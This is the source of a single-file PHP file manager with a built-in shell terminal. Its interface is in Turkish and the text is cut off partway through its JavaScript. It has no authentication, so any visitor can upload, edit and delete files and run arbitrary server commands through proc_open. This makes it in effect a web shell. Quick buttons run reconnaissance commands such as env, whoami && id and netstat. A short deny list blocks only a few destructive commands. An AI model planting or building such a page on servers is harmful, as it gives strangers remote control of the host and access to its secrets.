<?php
/**
 * PHP Dosya Yöneticisi + Shell Terminal
 * Tek dosya — Listeleme, Düzenleme, Silme, Yeniden Adlandırma, Yükleme, Shell
 */

// ============================================================
// YAPILANDIRMA
// ============================================================
define('ROOT_DIR',        __DIR__);
define('APP_TITLE',       'Dosya Yöneticisi');
define('ALLOW_DELETE',    true);
define('ALLOW_EDIT',      true);
define('ALLOW_RENAME',    true);
define('ALLOW_UPLOAD',    true);
define('ALLOW_NEW_FILE',  true);
define('ALLOW_NEW_FOLDER',true);
define('ALLOW_SHELL',     true);   // Shell'i kapatmak için false yapın
define('SHELL_HISTORY',   50);

$EDITABLE_EXTENSIONS = [
    'txt','php','html','htm','css','js','json','xml','md',
    'yaml','yml','ini','env','sh','py','sql','htaccess','conf','log','toml','tsx','ts',
];

// ============================================================
// YARDIMCI FONKSİYONLAR
// ============================================================
function safe_path(string $path): string|false {
    $real = realpath($path);
    if ($real === false) {
        $real = realpath(dirname($path));
        if ($real === false) return false;
        $real .= DIRECTORY_SEPARATOR . basename($path);
    }
    if (strpos($real, realpath(ROOT_DIR)) !== 0) return false;
    return $real;
}

function rel_path(string $abs): string {
    return ltrim(str_replace(realpath(ROOT_DIR), '', $abs), DIRECTORY_SEPARATOR . '/');
}

function format_size(int $bytes): string {
    if ($bytes === 0) return '0 B';
    $units = ['B','KB','MB','GB','TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

function is_editable(string $file): bool {
    global $EDITABLE_EXTENSIONS;
    return in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), $EDITABLE_EXTENSIONS);
}

function icon_for(string $path): string {
    if (is_dir($path)) return '📁';
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $map = [
        'php'=>'🐘','html'=>'🌐','htm'=>'🌐','css'=>'🎨','js'=>'⚡','ts'=>'⚡','tsx'=>'⚡',
        'json'=>'📋','xml'=>'📋','md'=>'📝','txt'=>'📄','sql'=>'🗄️',
        'jpg'=>'🖼️','jpeg'=>'🖼️','png'=>'🖼️','gif'=>'🖼️','webp'=>'🖼️','svg'=>'🖼️',
        'pdf'=>'📕','zip'=>'📦','tar'=>'📦','gz'=>'📦','rar'=>'📦',
        'mp4'=>'🎬','mp3'=>'🎵','py'=>'🐍','sh'=>'⚙️','log'=>'📃',
    ];
    return $map[$ext] ?? '📄';
}

function shell_exec_safe(string $cmd, string $cwd): array {
    $blocked = ['rm -rf /','mkfs','dd if=',':(){ :|:& };:','chmod -R 777 /'];
    foreach ($blocked as $b) {
        if (stripos($cmd, $b) !== false)
            return ['output'=>"⛔ Engellendi: Güvenlik politikası bu komutu reddetti.\n",'code'=>1];
    }
    $descriptors = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
    $env  = array_merge($_ENV, ['TERM'=>'xterm-256color','LANG'=>'en_US.UTF-8']);
    $proc = proc_open($cmd, $descriptors, $pipes, $cwd, $env);
    if (!is_resource($proc)) return ['output'=>"Komut başlatılamadı.\n",'code'=>-1];
    fclose($pipes[0]);
    $out  = stream_get_contents($pipes[1]);
    $err  = stream_get_contents($pipes[2]);
    fclose($pipes[1]); fclose($pipes[2]);
    $code = proc_close($proc);
    return ['output'=>$out.$err,'code'=>$code];
}

// ============================================================
// AJAX İŞLEYİCİ
// ============================================================
$action   = $_REQUEST['action'] ?? '';
$is_ajax  = isset($_SERVER['HTTP_X_REQUESTED_WITH']) ||
            in_array($action,['list','read','save','delete','rename','newfolder','newfile','upload','shell']);

if ($is_ajax && $action) {
    header('Content-Type: application/json; charset=utf-8');
    try {
        switch ($action) {

            case 'list':
                $dir = safe_path(ROOT_DIR.'/'.($_GET['path']??''));
                if (!$dir||!is_dir($dir)) throw new Exception('Geçersiz dizin');
                $items=[];
                foreach(scandir($dir) as $e){
                    if($e==='.'||($e==='..'&&$dir===realpath(ROOT_DIR))) continue;
                    $full=$dir.DIRECTORY_SEPARATOR.$e;
                    $items[]=['name'=>$e,'path'=>rel_path($full),'is_dir'=>is_dir($full),
                        'size'=>is_file($full)?format_size(filesize($full)):'-',
                        'mtime'=>date('d.m.Y H:i',filemtime($full)),
                        'icon'=>icon_for($full),'editable'=>is_file($full)&&is_editable($full)];
                }
                usort($items,fn($a,$b)=>($b['is_dir']-$a['is_dir'])?:strcmp($a['name'],$b['name']));
                echo json_encode(['ok'=>true,'items'=>$items,'path'=>rel_path($dir)]);
                break;

            case 'read':
                if(!ALLOW_EDIT) throw new Exception('İzin yok');
                $file=safe_path(ROOT_DIR.'/'.($_GET['path']??''));
                if(!$file||!is_file($file)) throw new Exception('Dosya bulunamadı');
                if(!is_editable($file)) throw new Exception('Bu tür düzenlenemez');
                echo json_encode(['ok'=>true,'content'=>file_get_contents($file),'path'=>rel_path($file)]);
                break;

            case 'save':
                if(!ALLOW_EDIT) throw new Exception('İzin yok');
                $data=json_decode(file_get_contents('php://input'),true);
                $file=safe_path(ROOT_DIR.'/'.($data['path']??''));
                if(!$file) throw new Exception('Geçersiz yol');
                if(!is_editable($file)) throw new Exception('Bu tür düzenlenemez');
                file_put_contents($file,$data['content']??'');
                echo json_encode(['ok'=>true,'msg'=>'Kaydedildi ✓']);
                break;

            case 'delete':
                if(!ALLOW_DELETE) throw new Exception('İzin yok');
                $data=json_decode(file_get_contents('php://input'),true);
                $target=safe_path(ROOT_DIR.'/'.($data['path']??''));
                if(!$target) throw new Exception('Geçersiz yol');
                if($target===realpath(ROOT_DIR)) throw new Exception('Kök silinemez');
                if(is_dir($target)){
                    $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target,FilesystemIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);
                    foreach($it as $f) $f->isDir()?rmdir($f):unlink($f);
                    rmdir($target);
                } else unlink($target);
                echo json_encode(['ok'=>true,'msg'=>'Silindi ✓']);
                break;

            case 'rename':
                if(!ALLOW_RENAME) throw new Exception('İzin yok');
                $data=json_decode(file_get_contents('php://input'),true);
                $old=safe_path(ROOT_DIR.'/'.($data['path']??''));
                $newname=basename($data['newname']??'');
                if(!$old||!$newname) throw new Exception('Geçersiz parametre');
                $new=safe_path(dirname($old).'/'.$newname);
                if(!$new) throw new Exception('Geçersiz isim');
                if(file_exists($new)) throw new Exception('Bu isim zaten var');
                rename($old,$new);
                echo json_encode(['ok'=>true,'msg'=>'Yeniden adlandırıldı ✓']);
                break;

            case 'newfolder':
                if(!ALLOW_NEW_FOLDER) throw new Exception('İzin yok');
                $data=json_decode(file_get_contents('php://input'),true);
                $parent=safe_path(ROOT_DIR.'/'.($data['path']??''));
                $name=basename($data['name']??'');
                if(!$parent||!$name) throw new Exception('Geçersiz parametre');
                $new=safe_path($parent.'/'.$name);
                if(!$new) throw new Exception('Geçersiz isim');
                if(file_exists($new)) throw new Exception('Zaten var');
                mkdir($new,0755);
                echo json_encode(['ok'=>true,'msg'=>'Klasör oluşturuldu ✓']);
                break;

            case 'newfile':
                if(!ALLOW_NEW_FILE) throw new Exception('İzin yok');
                $data=json_decode(file_get_contents('php://input'),true);
                $parent=safe_path(ROOT_DIR.'/'.($data['path']??''));
                $name=basename($data['name']??'');
                if(!$parent||!$name) throw new Exception('Geçersiz parametre');
                $new=safe_path($parent.'/'.$name);
                if(!$new) throw new Exception('Geçersiz isim');
                if(file_exists($new)) throw new Exception('Zaten var');
                file_put_contents($new,'');
                echo json_encode(['ok'=>true,'msg'=>'Dosya oluşturuldu ✓']);
                break;

            case 'upload':
                if(!ALLOW_UPLOAD) throw new Exception('İzin yok');
                $dir=safe_path(ROOT_DIR.'/'.($_POST['path']??''));
                if(!$dir||!is_dir($dir)) throw new Exception('Geçersiz dizin');
                $results=[];
                foreach($_FILES['files']['name'] as $i=>$fname){
                    if($_FILES['files']['error'][$i]!==UPLOAD_ERR_OK){$results[]=['name'=>$fname,'ok'=>false];continue;}
                    $dest=safe_path($dir.'/'.basename($fname));
                    if(!$dest){$results[]=['name'=>$fname,'ok'=>false];continue;}
                    move_uploaded_file($_FILES['files']['tmp_name'][$i],$dest);
                    $results[]=['name'=>$fname,'ok'=>true];
                }
                echo json_encode(['ok'=>true,'results'=>$results]);
                break;

            case 'shell':
                if(!ALLOW_SHELL) throw new Exception('Shell devre dışı');
                $data=json_decode(file_get_contents('php://input'),true);
                $cmd=trim($data['cmd']??'');
                $cwd=$data['cwd']??ROOT_DIR;
                $cwd_real=realpath($cwd)?:ROOT_DIR;

                if(empty($cmd)){echo json_encode(['ok'=>true,'output'=>'','cwd'=>$cwd_real]);break;}

                // cd komutunu özel işle
                if(preg_match('/^cd\s*(.*)?$/i',$cmd,$m)){
                    $target=trim($m[1]??'');
                    if($target===''||$target==='~') $new_cwd=ROOT_DIR;
                    else $new_cwd=realpath($cwd_real.'/'.$target)?:realpath($target);
                    if(!$new_cwd||strpos($new_cwd,realpath(ROOT_DIR))!==0){
                        echo json_encode(['ok'=>true,'output'=>"bash: cd: İzin reddedildi\n",'cwd'=>$cwd_real,'code'=>1]);
                        break;
                    }
                    echo json_encode(['ok'=>true,'output'=>'',$cwd=>$new_cwd,'cwd'=>$new_cwd,'code'=>0]);
                    break;
                }

                $result=shell_exec_safe($cmd,$cwd_real);
                echo json_encode(['ok'=>true,'output'=>$result['output'],'code'=>$result['code'],'cwd'=>$cwd_real]);
                break;

            default:
                throw new Exception('Bilinmeyen eylem');
        }
    } catch(Exception $e){
        http_response_code(400);
        echo json_encode(['ok'=>false,'msg'=>$e->getMessage()]);
    }
    exit;
}

// ============================================================
// HTML
// ============================================================
$shell_ok = ALLOW_SHELL && function_exists('proc_open');
$hostname = gethostname()?:'server';
$whoami   = trim(shell_exec('whoami')?:'www-data');
$root_real= realpath(ROOT_DIR);
?><!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?=htmlspecialchars(APP_TITLE)?></title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0b0d12;--surface:#131620;--surface2:#1a1e2e;--border:#232840;
  --accent:#4f8ef7;--danger:#e74c5e;--success:#3dcf8e;--warn:#f7a444;
  --text:#dde3f5;--muted:#6273a0;
  --mono:'JetBrains Mono','Fira Code',monospace;
  --sans:'Inter',system-ui,sans-serif;
  --radius:7px;--shadow:0 8px 32px rgba(0,0,0,.55);
}
body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:13px;height:100dvh;display:flex;flex-direction:column;overflow:hidden}

/* TAB BAR */
.tab-bar{display:flex;background:var(--surface);border-bottom:1px solid var(--border);flex-shrink:0;align-items:stretch}
.app-logo{padding:0 18px;display:flex;align-items:center;font-weight:700;font-size:13px;color:var(--accent);border-right:1px solid var(--border);white-space:nowrap;letter-spacing:-.3px}
.app-logo span{color:var(--muted);font-weight:400;font-size:11px;margin-left:4px}
.tab{padding:10px 20px;cursor:pointer;font-size:12px;font-weight:500;color:var(--muted);border-bottom:2px solid transparent;transition:all .15s;display:flex;align-items:center;gap:6px;user-select:none}
.tab:hover{color:var(--text)}
.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
.tab-spacer{flex:1}
.tab-info{padding:0 14px;display:flex;align-items:center;gap:8px;font-size:11px;color:var(--muted)}

/* PANES */
.pane{display:none;flex:1;overflow:hidden;flex-direction:column}
.pane.active{display:flex}

/* TOOLBAR */
.toolbar{background:var(--surface);border-bottom:1px solid var(--border);padding:7px 14px;display:flex;gap:6px;align-items:center;flex-shrink:0;flex-wrap:wrap}
.btn{display:inline-flex;align-items:center;gap:5px;padding:5px 12px;border-radius:var(--radius);border:1px solid var(--border);background:var(--surface2);color:var(--text);font-size:12px;font-family:inherit;cursor:pointer;transition:all .15s;white-space:nowrap}
.btn:hover{border-color:var(--accent);color:var(--accent)}
.btn.danger:hover{border-color:var(--danger);color:var(--danger)}
.btn.primary{background:var(--accent);border-color:var(--accent);color:#fff;font-weight:600}
.btn.primary:hover{background:#3a7ae0;border-color:#3a7ae0;color:#fff}
.t-sep{flex:1}

/* BREADCRUMB */
#breadcrumb{display:flex;align-items:center;gap:3px;font-size:11px;color:var(--muted);flex-wrap:wrap;padding:5px 14px;background:var(--surface);border-bottom:1px solid var(--border);flex-shrink:0}
#breadcrumb a{color:var(--accent);text-decoration:none;cursor:pointer}
#breadcrumb a:hover{text-decoration:underline}
.bsep{color:var(--border);margin:0 2px}
#search-box{background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:4px 10px;color:var(--text);font-size:12px;width:180px;outline:none;transition:border-color .15s}
#search-box:focus{border-color:var(--accent)}

/* FILE AREA */
.file-area{flex:1;display:flex;overflow:hidden}
#file-panel{flex:1;overflow-y:auto;padding:12px 14px}
#file-panel::-webkit-scrollbar{width:5px}
#file-panel::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}

table{width:100%;border-collapse:collapse}
thead th{text-align:left;padding:6px 10px;font-size:10px;font-weight:600;letter-spacing:.07em;text-transform:uppercase;color:var(--muted);border-bottom:1px solid var(--border);position:sticky;top:-12px;background:var(--bg);z-index:1}
tbody tr{transition:background .1s}
tbody tr:hover{background:var(--surface2)}
tbody td{padding:8px 10px;border-bottom:1px solid rgba(35,40,64,.4);vertical-align:middle}
.th-check,.td-check{width:30px}
td.name{cursor:pointer;font-weight:500}
td.name:hover .fname{color:var(--accent)}
.fname{transition:color .1s}
td.size,td.mtime{color:var(--muted);font-size:11px;white-space:nowrap}
td.actions{width:110px;text-align:right}
.act-btn{background:none;border:none;color:var(--muted);cursor:pointer;padding:3px 5px;border-radius:4px;font-size:13px;transition:all .15s}
.act-btn:hover.edit{color:var(--accent);background:rgba(79,142,247,.12)}
.act-btn:hover.rename{color:var(--warn);background:rgba(247,164,68,.12)}
.act-btn:hover.del{color:var(--danger);background:rgba(231,76,94,.12)}

/* EDITOR */
#editor-panel{width:50%;border-left:1px solid var(--border);display:flex;flex-direction:column;background:var(--surface);transition:width .2s;overflow:hidden}
#editor-panel.hidden{width:0;border:none}
.editor-header{padding:8px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;flex-shrink:0}
.editor-title{flex:1;font-size:11px;font-family:var(--mono);color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
#editor-textarea{flex:1;background:#090b10;border:none;color:#cdd6f4;font-family:var(--mono);font-size:12.5px;line-height:1.75;padding:14px;resize:none;outline:none;tab-size:4}
#editor-textarea::-webkit-scrollbar{width:5px}
#editor-textarea::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}

/* SEL BAR */
#sel-bar{display:none;background:rgba(79,142,247,.1);border:1px solid rgba(79,142,247,.25);border-radius:var(--radius);padding:4px 12px;align-items:center;gap:8px;font-size:11px;color:var(--accent)}
#sel-bar.visible{display:flex}

.loading{display:flex;align-items:center;justify-content:center;padding:48px;color:var(--muted);gap:12px}
.spinner{width:18px;height:18px;border:2px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .6s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.empty{text-align:center;padding:48px;color:var(--muted);font-size:13px}

/* ══ SHELL ══ */
#pane-shell{background:#08090e;flex-direction:column;font-family:var(--mono);font-size:13px}
.shell-topbar{background:var(--surface);border-bottom:1px solid var(--border);padding:6px 14px;display:flex;align-items:center;gap:10px;flex-shrink:0;font-size:11px;color:var(--muted)}
.shell-topbar .cwd-d{color:var(--accent);font-family:var(--mono);font-size:11px}
.shell-warn{background:rgba(247,164,68,.08);border-bottom:1px solid rgba(247,164,68,.2);padding:5px 14px;font-size:11px;color:var(--warn);flex-shrink:0;display:flex;align-items:center;gap:6px}
#terminal-output{flex:1;overflow-y:auto;padding:10px 14px;line-height:1.65;white-space:pre-wrap;word-break:break-all;color:#c8d3f5}
#terminal-output::-webkit-scrollbar{width:5px}
#terminal-output::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
.t-line{display:flex;flex-wrap:wrap;gap:0}
.t-prompt{color:var(--success);user-select:none;flex-shrink:0}
.t-prompt .uh{color:#89dceb}.t-prompt .at{color:var(--muted)}.t-prompt .ho{color:#cba6f7}
.t-prompt .co{color:var(--muted)}.t-prompt .pa{color:var(--accent)}.t-prompt .do{color:var(--success)}
.t-cmd{color:#cdd6f4}
.t-out{color:#a9b1d6}
.t-err{color:#f7768e}
.t-xok{color:var(--success);font-size:10px}
.t-xer{color:var(--danger);font-size:10px}
.quick-cmds{display:flex;gap:5px;padding:5px 14px 6px;background:rgba(13,15,24,.7);border-bottom:1px solid var(--border);flex-wrap:wrap;flex-shrink:0}
.qcmd{background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:2px 9px;font-size:11px;font-family:var(--mono);color:var(--muted);cursor:pointer;transition:all .15s}
.qcmd:hover{color:var(--accent);border-color:var(--accent)}
.shell-input-row{display:flex;align-items:center;padding:8px 14px;border-top:1px solid var(--border);background:var(--surface);gap:6px;flex-shrink:0}
.prompt-label{color:var(--success);font-family:var(--mono);font-size:13px;white-space:nowrap;flex-shrink:0}
.prompt-label .uh{color:#89dceb}.prompt-label .at{color:var(--muted)}.prompt-label .ho{color:#cba6f7}
.prompt-label .co{color:var(--muted)}.prompt-label .pa{color:var(--accent)}.prompt-label .do{color:var(--success)}
#shell-input{flex:1;background:transparent;border:none;color:#cdd6f4;font-family:var(--mono);font-size:13px;outline:none;caret-color:var(--accent)}
.shell-actions{display:flex;gap:4px}
.shell-btn{background:var(--surface2);border:1px solid var(--border);border-radius:5px;padding:3px 10px;color:var(--muted);font-size:11px;cursor:pointer;font-family:inherit;transition:all .15s}
.shell-btn:hover{color:var(--text);border-color:var(--accent)}
.shell-btn.run{color:var(--success);border-color:rgba(61,207,142,.3)}
.shell-btn.run:hover{background:rgba(61,207,142,.1)}

/* MODALS */
.overlay{position:fixed;inset:0;background:rgba(0,0,0,.65);backdrop-filter:blur(4px);display:flex;align-items:center;justify-content:center;z-index:100;opacity:0;pointer-events:none;transition:opacity .18s}
.overlay.show{opacity:1;pointer-events:all}
.modal{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:22px;width:360px;box-shadow:var(--shadow);transform:translateY(14px);transition:transform .18s}
.overlay.show .modal{transform:translateY(0)}
.modal h3{font-size:14px;margin-bottom:14px}
.modal label{font-size:11px;color:var(--muted);display:block;margin-bottom:5px}
.modal input[type=text]{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:7px 11px;color:var(--text);font-size:12.5px;outline:none;transition:border-color .15s}
.modal input[type=text]:focus{border-color:var(--accent)}
.modal-actions{display:flex;gap:8px;margin-top:18px;justify-content:flex-end}
#drop-zone{border:2px dashed var(--border);border-radius:var(--radius);padding:20px;text-align:center;color:var(--muted);cursor:pointer;transition:all .2s;margin-bottom:10px}
#drop-zone.drag-over{border-color:var(--accent);color:var(--accent);background:rgba(79,142,247,.05)}
#file-input{display:none}
#upload-list{max-height:160px;overflow-y:auto;font-size:11px}
.upload-item{display:flex;align-items:center;gap:6px;padding:3px 0}
.upload-item .status{margin-left:auto}

/* TOAST */
#toast{position:fixed;bottom:20px;right:20px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:9px 16px;font-size:12px;box-shadow:var(--shadow);z-index:200;transform:translateY(70px);opacity:0;transition:all .25s;max-width:320px}
#toast.show{transform:translateY(0);opacity:1}
#toast.ok{border-color:var(--success);color:var(--success)}
#toast.err{border-color:var(--danger);color:var(--danger)}

input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
@media(max-width:700px){#editor-panel{width:100%;position:fixed;inset:0;z-index:50;border:none}#editor-panel.hidden{display:none}td.mtime,th.mtime{display:none}}
</style>
</head>
<body>

<!-- TAB BAR -->
<div class="tab-bar">
  <div class="app-logo">⚙ <?=htmlspecialchars(APP_TITLE)?> <span>v2.0</span></div>
  <div class="tab active" id="tab-files" onclick="switchTab('files')">📁 Dosyalar</div>
  <?php if($shell_ok):?>
  <div class="tab" id="tab-shell" onclick="switchTab('shell')">💻 Terminal</div>
  <?php endif;?>
  <div class="tab-spacer"></div>
  <div class="tab-info">
    <span>🖥 <?=htmlspecialchars($hostname)?></span>
    <span>•</span>
    <span>👤 <?=htmlspecialchars($whoami)?></span>
    <span>•</span>
    <span>PHP <?=PHP_MAJOR_VERSION.'.'.PHP_MINOR_VERSION?></span>
  </div>
</div>

<!-- FILE PANE -->
<div class="pane active" id="pane-files">
  <div class="toolbar">
    <?php if(ALLOW_NEW_FOLDER):?><button class="btn" onclick="showModal('modal-folder')">📁 Yeni Klasör</button><?php endif;?>
    <?php if(ALLOW_NEW_FILE):?><button class="btn" onclick="showModal('modal-newfile')">📄 Yeni Dosya</button><?php endif;?>
    <?php if(ALLOW_UPLOAD):?><button class="btn primary" onclick="showModal('modal-upload')">⬆ Yükle</button><?php endif;?>
    <div id="sel-bar">
      <span id="sel-count">0 seçili</span>
      <?php if(ALLOW_DELETE):?><button class="btn danger" onclick="bulkDelete()">🗑 Sil</button><?php endif;?>
      <button class="btn" onclick="clearSelection()">✕</button>
    </div>
    <div class="t-sep"></div>
    <input id="search-box" type="text" placeholder="🔍 Filtrele..." oninput="filterTable(this.value)">
    <button class="btn" onclick="refresh()">↻</button>
  </div>
  <div id="breadcrumb"><a onclick="navigate('')">🏠 Kök</a></div>
  <div class="file-area">
    <div id="file-panel">
      <div class="loading" id="loading"><div class="spinner"></div> Yükleniyor…</div>
      <table id="file-table" style="display:none">
        <thead><tr>
          <th class="th-check"><input type="checkbox" id="chk-all" onchange="toggleAll(this)"></th>
          <th>Ad</th><th>Boyut</th><th class="mtime">Değiştirilme</th><th>İşlem</th>
        </tr></thead>
        <tbody id="file-body"></tbody>
      </table>
      <div class="empty" id="empty-msg" style="display:none">📂 Bu dizin boş.</div>
    </div>
    <div id="editor-panel" class="hidden">
      <div class="editor-header">
        <span class="editor-title" id="editor-title">-</span>
        <button class="btn primary" onclick="saveFile()">💾 Kaydet</button>
        <button class="btn" onclick="closeEditor()">✕</button>
      </div>
      <textarea id="editor-textarea" spellcheck="false"></textarea>
    </div>
  </div>
</div>

<!-- SHELL PANE -->
<?php if($shell_ok):?>
<div class="pane" id="pane-shell">
  <div class="shell-topbar">
    <span>💻 Terminal</span>
    <span>•</span>
    <span>Dizin: <span class="cwd-d" id="cwd-display"><?=htmlspecialchars($root_real)?></span></span>
    <div style="flex:1"></div>
    <button class="shell-btn" onclick="clearTerminal()">🗑 Temizle</button>
    <button class="shell-btn" onclick="copyOutput()">📋 Kopyala</button>
  </div>
  <div class="shell-warn">⚠ Bu terminal sunucuda doğrudan komut çalıştırır — dikkatli kullanın.</div>
  <div class="quick-cmds">
    <span style="color:var(--muted);font-size:10px;align-self:center">Hızlı:</span>
    <span class="qcmd" onclick="runQuick('ls -la')">ls -la</span>
    <span class="qcmd" onclick="runQuick('pwd')">pwd</span>
    <span class="qcmd" onclick="runQuick('ps aux')">ps aux</span>
    <span class="qcmd" onclick="runQuick('df -h')">df -h</span>
    <span class="qcmd" onclick="runQuick('free -h')">free -h</span>
    <span class="qcmd" onclick="runQuick('top -bn1 | head -20')">top</span>
    <span class="qcmd" onclick="runQuick('php -v')">php -v</span>
    <span class="qcmd" onclick="runQuick('uname -a')">uname</span>
    <span class="qcmd" onclick="runQuick('netstat -tlnp 2>/dev/null || ss -tlnp')">ports</span>
    <span class="qcmd" onclick="runQuick('cat /etc/os-release')">os</span>
    <span class="qcmd" onclick="runQuick('env')">env</span>
    <span class="qcmd" onclick="runQuick('whoami && id')">whoami</span>
    <span class="qcmd" onclick="runQuick('find . -name \'*.php\' | head -20')">find php</span>
    <span class="qcmd" onclick="runQuick('tail -50 /var/log/apache2/error.log 2>/dev/null || tail -50 /var/log/nginx/error.log 2>/dev/null')">error.log</span>
  </div>
  <div id="terminal-output"></div>
  <div class="shell-input-row">
    <div class="prompt-label" id="prompt-label">
      <span class="uh"><?=htmlspecialchars($whoami)?></span><span class="at">@</span><span class="ho"><?=htmlspecialchars($hostname)?></span><span class="co">:</span><span class="pa" id="prompt-path">~</span><span class="do"> $</span>
    </div>
    <input type="text" id="shell-input" placeholder="komut yazın..." autocomplete="off" autocorrect="off" spellcheck="false">
    <div class="shell-actions">
      <button class="shell-btn run" onclick="runShell()">▶ Çalıştır</button>
    </div>
  </div>
</div>
<?php endif;?>

<!-- TOAST -->
<div id="toast"></div>

<!-- MODALS -->
<div class="overlay" id="modal-folder" onclick="closeModal(this)">
  <div class="modal" onclick="event.stopPropagation()">
    <h3>📁 Yeni Klasör</h3>
    <label>Klasör adı</label>
    <input type="text" id="inp-folder" placeholder="klasor-adi" onkeydown="if(event.key==='Enter')doNewFolder()">
    <div class="modal-actions">
      <button class="btn" onclick="closeModal('modal-folder')">İptal</button>
      <button class="btn primary" onclick="doNewFolder()">Oluştur</button>
    </div>
  </div>
</div>

<div class="overlay" id="modal-newfile" onclick="closeModal(this)">
  <div class="modal" onclick="event.stopPropagation()">
    <h3>📄 Yeni Dosya</h3>
    <label>Dosya adı</label>
    <input type="text" id="inp-newfile" placeholder="dosya.txt" onkeydown="if(event.key==='Enter')doNewFile()">
    <div class="modal-actions">
      <button class="btn" onclick="closeModal('modal-newfile')">İptal</button>
      <button class="btn primary" onclick="doNewFile()">Oluştur</button>
    </div>
  </div>
</div>

<div class="overlay" id="modal-rename" onclick="closeModal(this)">
  <div class="modal" onclick="event.stopPropagation()">
    <h3>✏️ Yeniden Adlandır</h3>
    <label>Yeni ad</label>
    <input type="text" id="inp-rename" placeholder="yeni-ad" onkeydown="if(event.key==='Enter')doRename()">
    <div class="modal-actions">
      <button class="btn" onclick="closeModal('modal-rename')">İptal</button>
      <button class="btn primary" onclick="doRename()">Kaydet</button>
    </div>
  </div>
</div>

<div class="overlay" id="modal-upload" onclick="closeModal(this)">
  <div class="modal" onclick="event.stopPropagation()" style="width:420px">
    <h3>⬆ Dosya Yükle</h3>
    <div id="drop-zone" onclick="document.getElementById('file-input').click()"
         ondragover="event.preventDefault();this.classList.add('drag-over')"
         ondragleave="this.classList.remove('drag-over')"
         ondrop="handleDrop(event)">
      <div style="font-size:28px;margin-bottom:6px">📂</div>
      Tıklayın veya dosyaları sürükleyin
    </div>
    <input type="file" id="file-input" multiple onchange="handleFiles(this.files)">
    <div id="upload-list"></div>
    <div class="modal-actions">
      <button class="btn" onclick="closeModal('modal-upload')">Kapat</button>
      <button class="btn primary" id="btn-upload" onclick="doUpload()" disabled>Yükle</button>
    </div>
  </div>
</div>

<div class="overlay" id="modal-delete" onclick="closeModal(this)">
  <div class="modal" onclick="event.stopPropagation()">
    <h3>🗑 Silme Onayı</h3>
    <p id="del-msg" style="color:var(--muted);font-size:12px;line-height:1.55"></p>
    <div class="modal-actions">
      <button class="btn" onclick="closeModal('modal-delete')">İptal</button>
      <button class="btn danger" id="btn-del-confirm">Evet, Sil</button>
    </div>
  </div>
</div>

<script>
// ── STATE ──────────────────────────────────────────────────
let currentPath='', editorPath=null, renameTarget=null, deleteTarget=null;
let uploadFiles=[], selectedRows=new Set();
let shellCwd=<?=json_encode($root_real)?>, cmdHistory=[], histIdx=-1;

// ── TABS ───────────────────────────────────────────────────
function switchTab(n){
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.pane').forEach(p=>p.classList.remove('active'));
  document.getElementById('tab-'+n)?.classList.add('active');
  document.getElementById('pane-'+n)?.classList.add('active');
  if(n==='shell') setTimeout(()=>document.getElementById('shell-input')?.focus(),80);
}

// ── FILE MANAGER ───────────────────────────────────────────
async function navigate(path){
  currentPath=path; selectedRows.clear(); updateSelBar();
  document.getElementById('loading').style.display='flex';
  document.getElementById('file-table').style.display='none';
  document.getElementById('empty-msg').style.display='none';
  const r=await fetch(`?action=list&path=${encodeURIComponent(path)}`,{headers:{'X-Requested-With':'XMLHttpRequest'}});
  const d=await r.json();
  if(!d.ok){toast(d.msg,'err');return;}
  renderBreadcrumb(d.path); renderFiles(d.items);
  document.getElementById('loading').style.display='none';
  document.getElementById(d.items.length?'file-table':'empty-msg').style.display=d.items.length?'table':'block';
  document.getElementById('chk-all').checked=false;
  filterTable(document.getElementById('search-box').value);
}
function refresh(){navigate(currentPath)}

function renderBreadcrumb(path){
  const bc=document.getElementById('breadcrumb');
  let h=`<a onclick="navigate('')">🏠 Kök</a>`;
  if(path){
    const parts=path.split(/[\\/]/); let acc='';
    parts.forEach((p,i)=>{
      acc+=(acc?'/':'')+p; const cur=acc;
      h+=`<span class="bsep"> / </span>`;
      h+=i<parts.length-1?`<a onclick="navigate('${cur}')">${p}</a>`:`<span>${p}</span>`;
    });
  }
  bc.innerHTML=h;
}

function renderFiles(items){
  document.getElementById('file-body').innerHTML=items.map(item=>{
    const pe=item.path.replace(/'/g,"\\'");
    const name=item.name.replace(/</g,'&lt;').replace(/>/g,'&gt;');
    const acts=[];
    if(item.editable) acts.push(`<button class="act-btn edit" title="Düzenle" onclick="openEditor('${pe}')">✏️</button>`);
    acts.push(`<button class="act-btn rename" title="Yeniden Adlandır" onclick="startRename('${pe}','${name}')">🏷</button>`);
    acts.push(`<button class="act-btn del" title="Sil" onclick="confirmDelete('${pe}','${name}',${item.is_dir})">🗑</button>`);
    return `<tr data-name="${name.toLowerCase()}">
      <td class="td-check"><input type="checkbox" onchange="toggleRow(this,'${pe}')" data-path="${pe}"></td>
      <td class="name" onclick="${item.is_dir?`navigate('${pe}')`:item.editable?`openEditor('${pe}')`:''}">`+
      `<span class="file-icon">${item.icon}</span><span class="fname">${name}</span></td>
      <td class="size">${item.size}</td>
      <td class="mtime">${item.mtime}</td>
      <td class="actions">${acts.join('')}</td></tr>`;
  }).join('');
}

function filterTable(q){
  q=q.toLowerCase().trim();
